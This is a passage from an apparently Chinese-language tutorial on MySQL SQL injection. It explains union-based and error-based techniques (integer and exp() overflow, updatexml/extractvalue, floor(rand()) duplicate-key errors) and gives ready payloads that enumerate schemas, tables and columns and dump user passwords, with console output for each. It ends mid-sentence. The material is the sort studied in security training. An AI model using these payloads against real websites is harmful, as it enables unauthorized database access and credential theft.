class="line">information_schema的表tables中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表columns中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列column_name记录了所有数据库的表的列的名字</span><br></pre></td></tr></table></figure><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="right、left函数"><a href="#right、left函数" class="headerlink" title="right、left函数"></a>right、left函数</h5><p><code>LEFT()</code>函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，<strong>我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数</strong>。</p><p>right同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">67890</span>                 |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">90</span>                    |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+----------------------+</span><br><span class="line">| <span class="number">12345</span>                |</span><br><span class="line">+----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h5 id="isnull-exp"><a href="#isnull-exp" class="headerlink" title="isnull(exp)"></a>isnull(exp)</h5><p>如果exp为null返回1，否侧返回0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select isnull(<span class="number">1</span>+<span class="number">1</span>);</span><br><span class="line">+-------------+</span><br><span class="line">| isnull(<span class="number">1</span>+<span class="number">1</span>) |</span><br><span class="line">+-------------+</span><br><span class="line">|           <span class="number">0</span> |</span><br><span class="line">+-------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select isnull(<span class="number">0</span>);</span><br><span class="line">+-----------+</span><br><span class="line">| isnull(<span class="number">0</span>) |</span><br><span class="line">+-----------+</span><br><span class="line">|         <span class="number">0</span> |</span><br><span class="line">+-----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>可以配合注入来判断文件是否存在以及是否有权限读取文件。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,isnull(LOAD_FILE(<span class="string">&#x27;/Users/apple/Desktop/2.txt&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~1~&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="ifnull-expr1-expr2"><a href="#ifnull-expr1-expr2" class="headerlink" title="ifnull(expr1,expr2)"></a>ifnull(expr1,expr2)</h5><p>假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。</p><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><p>延时n秒，执行之后返回0。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(2);</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| sleep(2) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        0 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">2.00</span> sec)</span><br></pre></td></tr></table></figure><h5 id="exists"><a href="#exists" class="headerlink" title="exists()"></a>exists()</h5><p>exists子句返回的结果并不是从数据库中取出的结果集，而是一个布尔值，如果子句查询到数据，那么返回true，反之返回false。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exists(select * from math);</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">| exists(<span class="keyword">select</span> * <span class="keyword">from</span> math) |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">|                          <span class="number">1</span> |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h4 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h4><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><p>二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><ul><li><p>按位或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>|<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>|<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>^<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>^<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位与</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>&amp;<span class="number">5464</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>&amp;<span class="number">5464</span> |</span><br><span class="line">+--------+</span><br><span class="line">|      <span class="number">0</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>0与任何的数字A按位或、异或都是A数字。</p><p>0与任何数字按位与都是0。</p><p>逻辑运算符</p><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p><ul><li><p>与运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span>;</span><br><span class="line">+---------+</span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> |</span><br><span class="line">+---------+</span><br><span class="line">|       <span class="number">0</span> |</span><br><span class="line">+---------+    </span><br><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>;   </span><br><span class="line">+---------+     </span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> |      </span><br><span class="line">+---------+      </span><br><span class="line">|       <span class="number">1</span> |      </span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure></li><li><p>或运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br></pre></td></tr></table></figure></li><li><p>非运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">not</span> <span class="number">1</span>;</span><br><span class="line">  +-------+</span><br><span class="line">  | <span class="keyword">not</span> <span class="number">1</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  |     <span class="number">0</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select !<span class="number">0</span>;</span><br><span class="line">  +----+</span><br><span class="line">  | !<span class="number">0</span> |</span><br><span class="line">  +----+</span><br><span class="line">  |  <span class="number">1</span> |</span><br><span class="line">  +----+</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>原理：</p><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为<code>union</code>或<code>union all</code>。</p><p>条件：</p><p>页面有回显、有占位符</p><p>占位符：</p><p>从数据库中取出某些输入能够显示到页面上的某一个位置。</p><p>步骤：</p><ul><li><p>判断是否有注入</p></li><li><p>判断是数字型注入还是字符型注入</p></li><li><p>猜测查询列数</p><p>列数小,正常回显,num大,不回显。</p></li><li><p>寻找占位</p></li><li><p>获取所有数据库名</p></li><li><p>获取指定数据的所有表名</p></li><li><p>获取指定数据库的指定数据表的所有字段名</p></li><li><p>获取指定数据库的指定数据表的所有的内容</p></li></ul><h6 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h6><p>判断字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断显示位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库banner信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select version(),database()#</span></span><br></pre></td></tr></table></figure><p>判断数据库名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata–+</span><br></pre></td></tr></table></figure><p>判断数据库中的表名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断数据库中的表的列的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断字段内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><ul><li><p>BIGINT等数据类型溢出</p><ul><li><p>原理：</p><ul><li><p>在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。</p><p>在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>超出最大值就会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39;</span><br></pre></td></tr></table></figure></li><li><p>SQL注入利用</p><p>组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+!(select*from(select user())x);</span><br><span class="line">ERROR 1690 (22003): BIGINT value is out of range in &#39;(~(0) + (not((select &#39;root@localhost&#39; from dual))))&#39;</span><br></pre></td></tr></table></figure><p>返回0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from(select user())x</span><br></pre></td></tr></table></figure><p>返回1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~0+!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x)-~0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username, password from users where id&#x3D;&#39;1&#39; or !(select*from(select user())x)-~0;</span><br></pre></td></tr></table></figure></li></ul><p>注意：</p><p>当MySQL版本大于或等于5.5.53时，数据溢出注入无效。</p></li><li><p>exp()函数：当传入的数值大于709的时候就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure></li><li><p>exp函数与整形溢出结合</p><ul><li><p>mysql&gt;5.5.53时，则不能返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.26    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(~(select * from (select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39;</span><br></pre></td></tr></table></figure></li><li><p>mysql5.5.47可以在报错中返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>xpath语法错误</p><ul><li><p>原理：</p><p>mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。</p><ul><li><p>updatexml()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XMLdocument, XPathstring, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p>UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39;</span><br></pre></td></tr></table></figure></li><li><p>extractvalue()对XML文档进行查询的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br><span class="line">第一个参数：可以传入目标xml文档</span><br><span class="line">第二个参数：用Xpath路径法表示的查找路径</span><br></pre></td></tr></table></figure><p>寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>主键重复</p><ul><li><p>基本函数</p><ul><li><p>rand()</p><p>rand()随机产生一个0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand();</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">| 0.006128073675677249 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand();</span><br><span class="line">+---------------------+</span><br><span class="line">| rand()              |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.33123136435750067 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>rand(0)产生一个固定的0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>有几条数据就会返回几条随机数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand() from math;</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">|   0.6377726314941167 |</span><br><span class="line">|   0.1951690951317261 |</span><br><span class="line">|  0.06252761190992558 |</span><br><span class="line">|   0.7271308048880946 |</span><br><span class="line">|  0.44807121944434125 |</span><br><span class="line">| 0.058963713291067366 |</span><br><span class="line">|   0.9506049388559581 |</span><br><span class="line">+----------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from math;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>floor()该函数返回X的最大整数值，但不能大于X</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(5.23);</span><br><span class="line">+-------------+</span><br><span class="line">| floor(5.23) |</span><br><span class="line">+-------------+</span><br><span class="line">|           5 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。</p><p><code>floor(rand(0)*2)</code>:具有确定性</p><p><code>floor(rand()*2)</code>:具有不确定性</p></li></ul></li><li><p>原理：</p><p>count()和group by在遇到rand()产生的重复值时报错。</p><p><code>Select name,count(*)  from student group by name</code>    </p><p>这条语句的作用就是从<code>student</code>表中<code>select</code>出<code>name</code>和<code>count</code>(count会具体返回一个数字).这个数字的多少就是根据<code>grop by</code> 后面的<code>name</code>来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。</p><p>重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？</p><p>发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 <code>key</code> ，一个是计数值 